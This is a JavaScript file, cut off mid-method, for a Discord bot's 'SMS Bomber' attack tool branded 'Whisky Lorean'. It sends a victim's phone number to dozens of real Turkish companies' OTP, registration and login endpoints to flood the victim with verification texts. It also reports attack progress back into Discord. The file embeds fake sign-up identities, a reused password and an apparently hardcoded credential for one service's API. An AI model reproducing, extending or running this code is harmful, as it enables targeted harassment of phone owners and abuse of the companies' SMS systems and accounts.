const { MessageEmbed } = require("discord.js");

class SmsBomber {
    constructor(phone, interaction, mode) {
        this.phone = phone;
        this.mail = "toluqws@gmail.com"
        this.interaction = interaction;
        this.mode = mode;
        this.data = [];
        this.success = 0;
        this.error = 0;
        this.cancelled = false; // İptal durumu için bayrak
    }

    // Saldırıyı iptal etmek için metod
    cancel() {
        this.cancelled = true;
    }

    // Saldırının iptal edilip edilmediğini kontrol eden metod
    isCancelled() {
        return this.cancelled;
    }

    mesajiEditle() {
        if (this.isCancelled()) return;
        if (this.data.length % 5 !== 0 && this.data.length < 90) return;

        try {
            if (this.mode != "tekFirma") {
                if (this.mode == "cift" && this.data.length >= 50) {
                     this.interaction.editReply({ embeds: [new MessageEmbed().setAuthor("Başarılı!", this.interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`:white_check_mark: SMS Bomber saldırısı devam ediyor! \n:telephone: Hedef Numara: ||**${this.phone}**|| \n🎯 Gönderim Modu: ${this.mode.replace("tekli", "Tekli Gönderim").replace("cift", "Çift Gönderim")} \n\n\`\`\`ansi\n${this.data.slice(-50).join("\n")}\`\`\``).setFooter("Whisky Lorean - SMS Bomber", this.interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("GREEN"), new MessageEmbed().setDescription(`Mesaj, **Discord** limitini aştığı için daha fazla güncellenmeyecektir ancak saldırı devam etmektedir..`).setColor("ORANGE")], ephemeral: true });
                } else {
                     this.interaction.editReply({ embeds: [new MessageEmbed().setAuthor("Başarılı!", this.interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`:white_check_mark: SMS Bomber saldırısı devam ediyor! \n:telephone: Hedef Numara: ||**${this.phone}**|| \n🎯 Gönderim Modu: ${this.mode.replace("tekli", "Tekli Gönderim").replace("cift", "Çift Gönderim")} \n\n\`\`\`ansi\n${this.data.join("\n")}\`\`\``).setFooter("Whisky Lorean - SMS Bomber", this.interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("GREEN")], ephemeral: true });
                }
            } else {
                 this.interaction.editReply({ embeds: [new MessageEmbed().setAuthor("Başarılı!", this.interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`:white_check_mark: SMS Bomber saldırısı devam ediyor! \n:telephone: Hedef Numara: ||**${this.phone}**|| \n\n\`\`\`ansi\n${this.data.join("\n")}\`\`\``).setFooter("Whisky Lorean - SMS Bomber", this.interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("GREEN")], ephemeral: true });
            }
        } catch (error) {
            console.error("Mesaj düzenlenemedi:", error.message);
        }
    }

    async kahveDunyasi() {
        if (this.isCancelled()) return;
        try {
            const url = "https://core.kahvedunyasi.com:443/api/users/sys/sms/send";
            const headers = { "Content-Type": "application/json;charset=utf-8" };
            const json = { mobile_number: this.phone, token_type: "register_token" };
            const response = await fetch(url, { method: 'POST', headers: headers, body: JSON.stringify(json) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> core.kahvedunyasi.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> core.kahvedunyasi.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> core.kahvedunyasi.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async wmf() {
        if (this.isCancelled()) return;
        try {
            const response = await fetch("https://www.wmf.com.tr/users/register/", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ "confirm": "true", "date_of_birth": "1956-12-18", "email": this.mail, "email_allowed": "true", "first_name": "Whisky", "gender": "male", "last_name": "Lorean", "password": "29ZEY..zey18", "phone": `0${this.phone}` }) });
            if (response.status === 202) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> wmf.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> wmf.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> wmf.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async bim() {
        if (this.isCancelled()) return;
        try {
            const response = await fetch("https://bim.veesk.net:443/service/v1.0/account/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone: this.phone }) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> bim.veesk.net`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> bim.veesk.net`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> bim.veesk.net`); this.error += 1; }
        this.mesajiEditle();
    };

    async englishHome() {
        if (this.isCancelled()) return;
        try {
            const url = "https://www.englishhome.com:443/api/member/sendOtp";
            const json = { "Phone": "+90" + this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (!data.isError) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> englishhome.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> englishhome.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> englishhome.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async icq() {
        if (this.isCancelled()) return;
        try {
            const url = `https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&msisdn=%2B90${this.phone}`;
            const response = await fetch(url, { method: 'POST' });
            const data = await response.json();
            if (data.response.statusCode === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> u.icq.net`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> u.icq.net`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> u.icq.net`); this.error += 1; }
        this.mesajiEditle();
    };

    async suIste() {
        if (this.isCancelled()) return;
        try {
            const url = "https://suiste.com:443/api/auth/code";
            const data = new URLSearchParams({ "action": "register", "gsm": this.phone });
            const response = await fetch(url, { method: 'POST', body: data });
            const json = await response.json();
            if (json.code === "common.success") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> suiste.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> suiste.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> suiste.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async kimGb() {
        if (this.isCancelled()) return;
        try {
            const response = await fetch("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ msisdn: `90${this.phone}` }) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> kimGb`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> kimGb`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> kimGb`); this.error += 1; }
        this.mesajiEditle();
    };

    async tazi() {
        if (this.isCancelled()) return;
        try {
            const url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin";
            const json = { "cep_tel": this.phone, "cep_tel_ulkekod": "90" };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json;charset=utf-8" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.kod === "0000") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> mobileapiv2.tazi.tech`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> mobileapiv2.tazi.tech`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> mobileapiv2.tazi.tech`); this.error += 1; }
        this.mesajiEditle();
    };

    async hey() {
        if (this.isCancelled()) return;
        try {
            const url = `https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?phonenumber=${this.phone}`;
            const response = await fetch(url, { method: 'POST' });
            const data = await response.json();
            if (data.IsSuccess === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> heyapi.heymobility.tech`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> heyapi.heymobility.tech`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> heyapi.heymobility.tech`); this.error += 1; }
        this.mesajiEditle();
    };

    async biSu() {
        if (this.isCancelled()) return;
        try {
            const url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register";
            const data = new URLSearchParams(); data.append("phoneNumber", this.phone);
            const response = await fetch(url, { method: 'POST', body: data });
            const json = await response.json();
            if (json.errors == null) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> bisu.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> bisu.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> bisu.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async ucDortBes() {
        if (this.isCancelled()) return;
        try {
            const url = "https://api.345dijital.com:443/api/users/register";
            const json = { "email": this.mail, "name": "Whisky", "phoneNumber": `+90${this.phone}`, "surname": "Lorean" };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.error) { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.345dijital.com`); this.error += 1; }
            else { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.345dijital.com`); this.success += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.345dijital.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async macro() {
        if (this.isCancelled()) return;
        try {
            const url = "https://www.macrocenter.com.tr:443/rest/users/register/otp?reid=31";
            const json = { email: this.mail, phoneNumber: this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.successful === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> macrocenter.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> macrocenter.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> macrocenter.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async tiklaGelsin() {
        if (this.isCancelled()) return;
        try {
            const url = "https://svc.apps.tiklagelsin.com:443/user/graphql";
            const json = { operationName: "GENERATE_OTP", query: `mutation GENERATE_OTP($phone: String) { generateOtp(phone: $phone) }`, variables: { phone: `+90${this.phone}` } };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.data.generateOtp === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> svc.apps.tiklagelsin.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> svc.apps.tiklagelsin.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> svc.apps.tiklagelsin.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async altinYildiz() {
        if (this.isCancelled()) return;
        try {
            const url = `https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm=${this.phone}`;
            const response = await fetch(url, { method: 'POST' });
            const data = await response.json();
            if (data.Success === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.altinyildizclassics.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.altinyildizclassics.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.altinyildizclassics.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async naosStars() {
        if (this.isCancelled()) return;
        try {
            const url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350";
            const json = { "telephone": `+90${this.phone}`, "type": "register" };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.naosstars.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.naosstars.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.naosstars.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async isteGelsin() {
        if (this.isCancelled()) return;
        try {
            const url = "https://prod.fasapi.net:443/";
            const json = { "operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": { "phoneNumber": `90${this.phone}` } };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.data.sendOtp2.alreadySent === false) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> prod.fasapi.net`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> prod.fasapi.net`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> prod.fasapi.net`); this.error += 1; }
        this.mesajiEditle();
    };

    async hayatSu() {
        if (this.isCancelled()) return;
        try {
            const url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp";
            const data = new URLSearchParams({ mobilePhoneNumber: this.phone, actionType: "register" });
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: data });
            const result = await response.json();
            if (result.is_success === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.hayatsu.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.hayatsu.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.hayatsu.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async evIdea() {
        if (this.isCancelled()) return;
        try {
            const url = "https://www.evidea.com:443/users/register/";
            const body = `first_name=Whisky&last_name=Lorean&email=${this.mail}&email_allowed=false&sms_allowed=true&password=29ZEY..zey18&phone=0${this.phone}&confirm=true`;
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: body });
            if (response.status === 202) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> evidea.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> evidea.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> evidea.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async koton() {
        if (this.isCancelled()) return;
        try {
            const url = "https://www.koton.com:443/users/register/";
            const body = `first_name=Merdo&last_name=Lorean&email=${this.mail}&password=29ZEY..zey18&phone=0${this.phone}&confirm=true&sms_allowed=true&email_allowed=true&date_of_birth=1993-07-02&call_allowed=true`;
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: body });
            if (response.status === 202) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> koton.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> koton.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> koton.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async hizliEcza() {
        if (this.isCancelled()) return;
        try {
            const url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP";
            const json = { "otpOperationType": 2, "phoneNumber": `+90${this.phone}` };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.isSuccess === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> hizlieczaprodapi.hizliecza.net`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> hizlieczaprodapi.hizliecza.net`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> hizlieczaprodapi.hizliecza.net`); this.error += 1; }
        this.mesajiEditle();
    };

    async metro() {
        if (this.isCancelled()) return;
        try {
            const url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend";
            const json = { "methodType": "2", "mobilePhoneNumber": `+90${this.phone}` };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.status === "success") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> feature.metro-tr.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> feature.metro-tr.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> feature.metro-tr.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async qumpara() {
        if (this.isCancelled()) return;
        try {
            const url = "https://tr-api.fisicek.com:443/v1.3/auth/getOTP";
            const json = { "msisdn": `+90${this.phone}` };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> tr-api.fisicek.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> tr-api.fisicek.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> tr-api.fisicek.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async ipragaz() {
        if (this.isCancelled()) return;
        try {
            const url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp";
            const json = { "birthDate": "18/12/1999", "name": "Whisky Lorean", "phoneNumber": this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> ipapp.ipragaz.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> ipapp.ipragaz.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> ipapp.ipragaz.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async migros() {
        if (this.isCancelled()) return;
        try {
            const url = "https://rest.migros.com.tr:443/sanalmarket/users/register/otp";
            const json = { email: this.mail, phoneNumber: this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.successful === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> rest.migros.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> rest.migros.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> rest.migros.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async paybol() {
        if (this.isCancelled()) return;
        try {
            const url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms";
            const json = { "phone_number": `90${this.phone}` };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.status === 0) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> pyb-mobileapi.walletgate.io`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> pyb-mobileapi.walletgate.io`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> pyb-mobileapi.walletgate.io`); this.error += 1; }
        this.mesajiEditle();
    };

    async fileMarket() {
        if (this.isCancelled()) return;
        try {
            const url = "https://api.filemarket.com.tr:443/v1/otp/send";
            const json = { "mobilePhoneNumber": `90${this.phone}` };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.responseType === "SUCCESS") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.filemarket.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.filemarket.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.filemarket.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async joker() {
        if (this.isCancelled()) return;
        try {
            const url = "https://api.joker.com.tr:443/api/register";
            const json = { "firstName": "Merdo", "lastName": "Lorean", "password": "29ZEY..zey18", "phoneNumber": `0${this.phone}`, "username": this.mail };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.message === "Doğrulama kodu gönderildi.") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.joker.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.joker.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.joker.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async akasya() {
        if (this.isCancelled()) return;
        try {
            const url = "https://akasya-admin.poilabs.com:443/v1/tr/sms";
            const json = { "phone": this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.result === "SMS sended succesfully!") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> akasya-admin.poilabs.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> akasya-admin.poilabs.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> akasya-admin.poilabs.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async akbati() {
        if (this.isCancelled()) return;
        try {
            const url = "https://akbati-admin.poilabs.com:443/v1/tr/sms";
            const json = { "phone": this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.result === "SMS sended succesfully!") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> akbati-admin.poilabs.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> akbati-admin.poilabs.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> akbati-admin.poilabs.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async clickMe() {
        if (this.isCancelled()) return;
        try {
            const url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code";
            const json = { phone: this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.isSuccess === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> mobile-gateway.clickmelive.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> mobile-gateway.clickmelive.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> mobile-gateway.clickmelive.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async happy() {
        if (this.isCancelled()) return;
        try {
            const url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone";
            const data = new URLSearchParams(); data.append("telephone", this.phone);
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: data });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> happy.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> happy.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> happy.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async komagene() {
        if (this.isCancelled()) return;
        try {
            const url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder";
            const json = { Telefon: this.phone, FirmaId: "32" };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.Success === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> gateway.komagene.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> gateway.komagene.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> gateway.komagene.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async kuryemGelsin() {
        if (this.isCancelled()) return;
        try {
            const url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage";
            const json = { phoneNumber: this.phone, phone_country_code: "+90" };
            const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(json) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.kuryemgelsin.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.kuryemgelsin.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.kuryemgelsin.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async porty() {
        if (this.isCancelled()) return;
        try {
            const url = "https://panel.porty.tech:443/api.php?";
            const json = { "job": "start_login", "phone": this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.status === "success") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> panel.porty.tech`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> panel.porty.tech`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> panel.porty.tech`); this.error += 1; }
        this.mesajiEditle();
    };

    async taksim() {
        if (this.isCancelled()) return;
        try {
            const url = "https://service.taksim.digital:443/services/PassengerRegister/Register";
            const json = { "countryPhoneCode": "+90", "name": "Whisky", "phoneNo": this.phone, "surname": "Lorean" };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.success === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> service.taksim.digital`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> service.taksim.digital`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> service.taksim.digital`); this.error += 1; }
        this.mesajiEditle();
    };

    async tasdelen() {
        if (this.isCancelled()) return;
        try {
            const url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend";
            const json = { PhoneNumber: this.phone, user: { Password: "Aa123!35@1", UserName: "MobilOperator" } };
            const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.Result === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> 94.102.66.162:80`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> 94.102.66.162:80`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> 94.102.66.162:80`); this.error += 1; }
        this.mesajiEditle();
    };

    async tasimacim() {
        if (this.isCancelled()) return;
        try {
            const url = "https://server.tasimacim.com/requestcode";
            const json = { phone: this.phone, lang: "tr" };
            const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(json) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> server.tasimacim.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> server.tasimacim.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> server.tasimacim.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async uysal() {
        if (this.isCancelled()) return;
        try {
            const url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms";
            const json = { "phone_number": this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.uysalmarket.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.uysalmarket.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.uysalmarket.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async yapp() {
        if (this.isCancelled()) return;
        try {
            const url = "https://yapp.com.tr:443/api/mobile/v1/register";
            const json = { email: this.mail, firstname: "Whisky", lastname: "Lorean", phone_number: this.phone };
            const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(json) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> yapp.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> yapp.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> yapp.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async yilmazTicaret() {
        if (this.isCancelled()) return;
        try {
            const url = "http://www.yilmazticaret.net:80/restapi2/register/";
            const data = new FormData(); data.append("telefon", `0 ${this.phone}`);
            const response = await fetch(url, { method: 'POST', body: data });
            const jsonResponse = await response.json();
            if (jsonResponse.giris === "success") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> yilmazticaret.net`); this.success += 1; }
